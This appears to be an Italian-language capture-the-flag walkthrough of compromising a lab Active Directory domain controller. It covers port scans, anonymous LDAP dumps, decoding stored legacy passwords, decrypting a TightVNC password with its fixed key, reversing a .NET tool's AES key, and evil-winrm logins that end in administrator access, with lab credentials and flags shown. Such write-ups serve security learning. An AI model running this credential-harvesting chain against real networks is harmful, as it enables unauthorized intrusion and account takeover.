@@ -1,0 +1,667 @@
+10.10.10.182
+
+
+
+sudo masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.182                                     1 ⨯
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-20 16:57:20 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 139/tcp on 10.10.10.182
+Discovered open port 49154/tcp on 10.10.10.182
+Discovered open port 445/tcp on 10.10.10.182
+Discovered open port 3269/tcp on 10.10.10.182
+Discovered open port 49155/tcp on 10.10.10.182
+Discovered open port 49170/tcp on 10.10.10.182
+Discovered open port 636/tcp on 10.10.10.182
+Discovered open port 49157/tcp on 10.10.10.182
+Discovered open port 3268/tcp on 10.10.10.182
+Discovered open port 135/tcp on 10.10.10.182
+Discovered open port 5985/tcp on 10.10.10.182
+Discovered open port 49158/tcp on 10.10.10.182
+Discovered open port 53/tcp on 10.10.10.182
+Discovered open port 389/tcp on 10.10.10.182
+Discovered open port 88/tcp on 10.10.10.182
+
+
+
+nmap -sC -sV -Pn -p139,49154,445,3269,49155,49170,636,49157,3268,135,5985,49158,53,389,88 10.10.10.182
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-20 18:00 CET
+Nmap scan report for 10.10.10.182
+Host is up (0.33s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-20 17:03:09Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 2m22s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2021-12-20T17:04:03
+|_  start_date: 2021-12-20T16:58:07
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 106.89 seconds
+
+
+
+c'è active directory
+
+
+
+
+port 53 (DNS): niente
+port 445 (SMB): niente
+ldap:
+
+
+ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local"  > all_ldap_anonymous.txt      --> ottengo molte info, devo filtrarle per trovare qualcosa di utile
+ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=Person)' sAMAccountName > ldap_samaccountnames_anonymous.txt     ----> sam account names
+ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=Person)' > ldap_persons_allinfo.txt          ---> all accounts info
+
+
+tra queste account info non trovo passwords però trovo:
+
+
+sAMAccountName: r.thompson
+cascadeLegacyPwd: clk0bjVldmE=
+
+sembra essere un campo base64 e visto che fa riferimento a una pwd può essere utile
+
+decodifico------> rY4n5eva
+
+potrebbe essere una password per questo utente:
+
+r.thompson:rY4n5eva
+
+provo ad accedere con evil-winrm
+
+non riesco ad accedere, potrebbe essere perchè la pwd è sbagliata o perchè non ha accesso remoto, posso provare ad usare questo account per listare di nuovo smb:
+
+ora riesco ad accedere ad alcune info:
+
+
+smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182
+[+] IP: 10.10.10.182:445	Name: 10.10.10.182
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	Audit$                                            	NO ACCESS
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	print$                                            	READ ONLY	Printer Drivers
+	SYSVOL                                            	READ ONLY	Logon server share
+
+
+prima di vedere cosa c'è nei vari shares provo a vedere se con impacket riesco ad ottenere tgt ecc:
+
+python3 GetNPUsers.py -dc-ip 10.10.10.182 -request 'cascade.local/r.thompson:rY4n5eva' -format hashcat       1 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+No entries found!
+
+niente
+
+analizzo gli shares
+
+
+inizio da Data:
+
+smbclient //10.10.10.182/Data -U r.thompson                                                                   1 ⨯
+Enter WORKGROUP\r.thompson's password:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jan 27 04:27:34 2020
+  ..                                  D        0  Mon Jan 27 04:27:34 2020
+  Contractors                         D        0  Mon Jan 13 02:45:11 2020
+  Finance                             D        0  Mon Jan 13 02:45:06 2020
+  IT                                  D        0  Tue Jan 28 19:04:51 2020
+  Production                          D        0  Mon Jan 13 02:45:18 2020
+  Temps                               D        0  Mon Jan 13 02:45:15 2020
+
+posso accedere solo ad IT:
+
+smb: \IT\> dir
+  .                                   D        0  Tue Jan 28 19:04:51 2020
+  ..                                  D        0  Tue Jan 28 19:04:51 2020
+  Email Archives                      D        0  Tue Jan 28 19:00:30 2020
+  LogonAudit                          D        0  Tue Jan 28 19:04:40 2020
+  Logs                                D        0  Wed Jan 29 01:53:04 2020
+  Temp                                D        0  Tue Jan 28 23:06:59 2020
+
+
+
+
+
+  smb: \IT\Email Archives\> dir
+    .                                   D        0  Tue Jan 28 19:00:30 2020
+    ..                                  D        0  Tue Jan 28 19:00:30 2020
+    Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 19:00:12 2020
+
+  		6553343 blocks of size 4096. 1625356 blocks available
+  smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html
+
+
+
+
+
+
+
+  From:                                         Steve Smith
+
+  To:                                               IT (Internal)
+
+  Sent:                                           14 June 2018 14:07
+
+  Subject:                                     Meeting Notes
+
+
+
+  For anyone that missed yesterday’s meeting (I’m looking at you Ben). Main points are below:
+
+
+
+  -- New production network will be going live on Wednesday so keep an eye out for any issues.
+
+  -- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
+
+  -- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.
+
+
+
+  Steve
+
+
+
+  smb: \IT\Logs\> dir
+    .                                   D        0  Wed Jan 29 01:53:04 2020
+    ..                                  D        0  Wed Jan 29 01:53:04 2020
+    Ark AD Recycle Bin                  D        0  Fri Jan 10 17:33:45 2020
+    DCs                                 D        0  Wed Jan 29 01:56:00 2020
+
+  		6553343 blocks of size 4096. 1625338 blocks available
+  smb: \IT\Logs\> cd "Ark AD Recycle Bin"
+  smb: \IT\Logs\Ark AD Recycle Bin\> dir
+    .                                   D        0  Fri Jan 10 17:33:45 2020
+    ..                                  D        0  Fri Jan 10 17:33:45 2020
+    ArkAdRecycleBin.log                 A     1303  Wed Jan 29 02:19:11 2020
+
+  		6553343 blocks of size 4096. 1625338 blocks available
+  smb: \IT\Logs\Ark AD Recycle Bin\> get ArkAdRecycleBin.log
+  getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (1,4 KiloBytes/sec) (average 1,9 KiloBytes/sec)
+  smb: \IT\Logs\Ark AD Recycle Bin\> cd ..
+  smb: \IT\Logs\> dir
+    .                                   D        0  Wed Jan 29 01:53:04 2020
+    ..                                  D        0  Wed Jan 29 01:53:04 2020
+    Ark AD Recycle Bin                  D        0  Fri Jan 10 17:33:45 2020
+    DCs                                 D        0  Wed Jan 29 01:56:00 2020
+
+  		6553343 blocks of size 4096. 1625338 blocks available
+  smb: \IT\Logs\> cd DCs\
+  smb: \IT\Logs\DCs\> dir
+    .                                   D        0  Wed Jan 29 01:56:00 2020
+    ..                                  D        0  Wed Jan 29 01:56:00 2020
+    dcdiag.log                          A     5967  Fri Jan 10 17:17:30 2020
+
+  		6553343 blocks of size 4096. 1625338 blocks available
+  smb: \IT\Logs\DCs\> get dcdiag.log
+
+
+  smb: \IT\temp\s.smith\> dir
+    .                                   D        0  Tue Jan 28 21:00:01 2020
+    ..                                  D        0  Tue Jan 28 21:00:01 2020
+    VNC Install.reg                     A     2680  Tue Jan 28 20:27:44 2020
+
+  		6553343 blocks of size 4096. 1625078 blocks available
+  smb: \IT\temp\s.smith\> get "VNC Install.reg"
+  getting file \IT\temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (2,5 KiloBytes/sec) (average 3,0 KiloBytes/sec)
+
+
+contenuto del file VNC Install.reg:
+
+  Windows Registry Editor Version 5.00
+
+  [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+  [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+  "ExtraPorts"=""
+  "QueryTimeout"=dword:0000001e
+  "QueryAcceptOnTimeout"=dword:00000000
+  "LocalInputPriorityTimeout"=dword:00000003
+  "LocalInputPriority"=dword:00000000
+  "BlockRemoteInput"=dword:00000000
+  "BlockLocalInput"=dword:00000000
+  "IpAccessControl"=""
+  "RfbPort"=dword:0000170c
+  "HttpPort"=dword:000016a8
+  "DisconnectAction"=dword:00000000
+  "AcceptRfbConnections"=dword:00000001
+  "UseVncAuthentication"=dword:00000001
+  "UseControlAuthentication"=dword:00000000
+  "RepeatControlAuthentication"=dword:00000000
+  "LoopbackOnly"=dword:00000000
+  "AcceptHttpConnections"=dword:00000001
+  "LogLevel"=dword:00000000
+  "EnableFileTransfers"=dword:00000001
+  "RemoveWallpaper"=dword:00000001
+  "UseD3D"=dword:00000001
+  "UseMirrorDriver"=dword:00000001
+  "EnableUrlParams"=dword:00000001
+  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+  "AlwaysShared"=dword:00000000
+  "NeverShared"=dword:00000000
+  "DisconnectClients"=dword:00000001
+  "PollingInterval"=dword:000003e8
+  "AllowLoopback"=dword:00000000
+  "VideoRecognitionInterval"=dword:00000bb8
+  "GrabTransparentWindows"=dword:00000001
+  "SaveLogToAllUsersPath"=dword:00000000
+  "RunControlInterface"=dword:00000001
+  "IdleTimeout"=dword:00000000
+  "VideoClasses"=""
+  "VideoRects"=""
+
+
+
+
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f    ---->    portandola in ascii direttamente non ha un senso, da caratteri non riconosciuti
+perchè è criptata ovviamente
+
+per decriptarla si possono usare vari tool:
+
+https://github.com/frizb/PasswordDecrypts
+
+echo -n 6BCF2A4B6E5ACA0F | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
+00000008
+
+
+la pwd è
+
+sT333ve2
+
+visto che questo era nei file dell'account s.smith , potrebbe essere la sua pwd
+
+posso provare se per questo utente l'accesso remoto è consentito (quindi provo ad usare evil winrm):
+
+s.smith:sT333ve2
+
+
+*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
+cascade\s.smith
+
+
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
+30dfb1d6c421f69e2752c7302eb6d173
+
+*Evil-WinRM* PS C:\Users\s.smith> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/25/2020  11:17 AM                Administrator
+d-----        1/28/2020  11:37 PM                arksvc
+d-r---        7/14/2009   5:57 AM                Public
+d-----        1/15/2020  10:22 PM                s.smith
+
+
+dal log recuperato prima si legge
+
+1/10/2018 15:43	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43	[MAIN_THREAD]	Validating settings...
+1/10/2018 15:43	[MAIN_THREAD]	Error: Access is denied
+1/10/2018 15:43	[MAIN_THREAD]	Exiting with error code 5
+2/10/2018 15:56	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56	[MAIN_THREAD]	Validating settings...
+2/10/2018 15:56	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
+2/10/2018 15:56	[MAIN_THREAD]	Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
+2/10/2018 15:56	[MAIN_THREAD]	Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+2/10/2018 15:56	[MAIN_THREAD]	Exiting with error code 0
+8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
+8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
+8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0
+
+
+quindi tempAdmin è stato spostato nel cestino, nella mail c'era scritto che tempAdmin ha la stessa pasword di Admin quindi se recupero TempAdmin potrei riuscire ad accedere alla password di admin
+
+
+
+*Evil-WinRM* PS C:\>  cd c:\"$"RECYCLE.BIN
+
+
+(devo mettere "$" per farlo leggere come stringa altrimenti mettendo solo $RECYCLE.BIN lo vede come variabile e non trova la directory)
+
+*Evil-WinRM* PS C:\$RECYCLE.BIN> dir -force
+
+
+    Directory: C:\$RECYCLE.BIN
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-         1/9/2020   3:11 PM                S-1-5-21-3332504370-1206983947-1165150453-1000
+d--hs-        1/29/2020   9:28 PM                S-1-5-21-3332504370-1206983947-1165150453-500
+
+
+purtroppo non ho accesso a nessuna delle due dir
+forse mi serve accesso come ArkSvc ??
+
+non riesco ad ottenre TGT senza la pwd dell'utente ArkSvc
+
+Get-ADUser -identity s.smith -properties *
+
+posso porvare a tornare su smb con le credenziali di s.smith per vedere se h accesso a qualche altro share:
+
+smbmap -u s.smith -p sT333ve2 -H 10.10.10.182
+[+] IP: 10.10.10.182:445	Name: 10.10.10.182
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	Audit$                                            	READ ONLY
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	print$                                            	READ ONLY	Printer Drivers
+	SYSVOL                                            	READ ONLY	Logon server share
+
+
+in più ho l'accesso a Audit
+
+smbclient //10.10.10.182/Audit"$" -U s.smith                                                                130 ⨯
+Enter WORKGROUP\s.smith's password:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jan 29 19:01:26 2020
+  ..                                  D        0  Wed Jan 29 19:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 22:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 19:00:20 2020
+  DB                                  D        0  Tue Jan 28 22:40:59 2020
+  RunAudit.bat                        A       45  Wed Jan 29 00:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 07:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 07:38:38 2019
+  x64                                 D        0  Sun Jan 26 23:25:27 2020
+  x86                                 D        0  Sun Jan 26 23:25:27 2020
+
+
+  smb: \DB\> dir
+    .                                   D        0  Tue Jan 28 22:40:59 2020
+    ..                                  D        0  Tue Jan 28 22:40:59 2020
+    Audit.db                           An    24576  Tue Jan 28 22:39:24 2020
+
+  		6553343 blocks of size 4096. 1624324 blocks available
+  smb: \DB\> get Audit.db
+
+  └─$ file Audit.db
+  Audit.db: SQLite 3.x database, last written using SQLite version 3027002
+
+
+è un db di tipo sqlite
+
+per aprirlo posso usare db browser for sqlite (built-in kali)
+
+nella tabella ldap:
+
+ArkSvc	BQO5l5Kj9MdErXx6Q6AGOw==	cascade.local
+
+
+nella tabella DeletedUserAudit:
+
+test	Test
+DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d	CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+deleted	deleted guy
+DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef	CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
+TempAdmin	TempAdmin
+DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a	CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
+
+posso provare a crackare la pwd per ArkSvc
+il problema è che non so come è stata criptata
+
+posso sfruttare il file exe: CascAudit.exe che sta sempre sotto samba
+
+provo a cercare su internet ma non lo trovo quindi è proprietario, devo scaricarlo e decompilarlo per capire cosa c'è all'interno
+
+
+file CascAudit.exe                                                                                          127 ⨯
+CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+è un file .net, posso usare un decompiler .net qualsiasi ad esempio: https://github.com/dnSpy/dnSpy/releases
+
+wine64 dnSpy.exe
+
+
+nel mainModule c'è:
+
+password = Crypto.DecryptString(text3, "c4scadek3y654321");
+
+quindi ora ho la funzione e la key ma la funzione DecryptString non si trova in questo exe, quindi deve stare in qualche dll, negli import vedo:
+
+using System;
+using System.Collections;
+using System.Data.SQLite;
+using System.DirectoryServices;
+using CascAudiot.My;
+using CascCrypto;
+using Microsoft.VisualBasic.CompilerServices;
+
+using CascCrypto;     -----> CascCrypto.dll si trova sempre sotto smb quindi posso scaricarlo
+
+file CascCrypto.dll
+CascCrypto.dll: PE32 executable (DLL) (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+
+è sempre .net quindi forse riesco a decompilarlo sempre usando dnSpy
+
+
+e infatti dentro ci trovo:
+
+public static string DecryptString(string EncryptedString, string Key)
+		{
+			byte[] array = Convert.FromBase64String(EncryptedString);
+			Aes aes = Aes.Create();
+			aes.KeySize = 128;
+			aes.BlockSize = 128;
+			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+			aes.Mode = 1;
+			aes.Key = Encoding.UTF8.GetBytes(Key);
+			string @string;
+			using (MemoryStream memoryStream = new MemoryStream(array))
+			{
+				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), 0))
+				{
+					byte[] array2 = new byte[checked(array.Length - 1 + 1)];
+					cryptoStream.Read(array2, 0, array2.Length);
+					@string = Encoding.UTF8.GetString(array2);
+				}
+			}
+			return @string;
+		}
+
+
+sfruttando la funzione che decripta ho creato un piccolo programma in c# che decripta la stringa in input, ottengo che la password è:
+
+ArkSvc:w3lc0meFr31nd
+
+
+con questa password riesco ad accedere con evil-winrm:
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
+cascade\arksvc
+
+neanche con questo utente però riesco ad accedere alle dir nel recycle bin quindi devo trovare un'altra strada
+
+
+
+https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html
+
+
+
+*Evil-WinRM* PS C:\users\arksvc> Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name              : CASC-WS1
+                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+ObjectClass       : computer
+ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+Deleted           : True
+DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Scheduled Tasks
+                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+ObjectClass       : group
+ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+Deleted           : True
+DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ObjectClass       : groupPolicyContainer
+ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+Deleted           : True
+DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Machine
+                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+ObjectClass       : container
+ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+Deleted           : True
+DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name              : User
+                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+ObjectClass       : container
+ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+
+
+
+
+*Evil-WinRM* PS C:\users\arksvc> Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects | Restore-ADObject
+Insufficient access rights to perform the operation
+
+
+
+non posso fare il restore
+
+però riesco a ispezionare gli oggetti cancellati:
+
+
+*Evil-WinRM* PS C:\users\arksvc> Get-ADObject -Filter {SamAccountName -eq "TempAdmin"} -IncludeDeletedObjects -Proper
+ties *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+
+
+anche in questo caso trovo:
+
+
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+
+anche in questo caso è in base 64:
+
+
+baCT3r1aN00dles
+
+
+riesco ad entrare con evil-winrm
+
+./evil-winrm.rb -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+cascade\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+9858a2936b555f45099a9ccd48436e8a
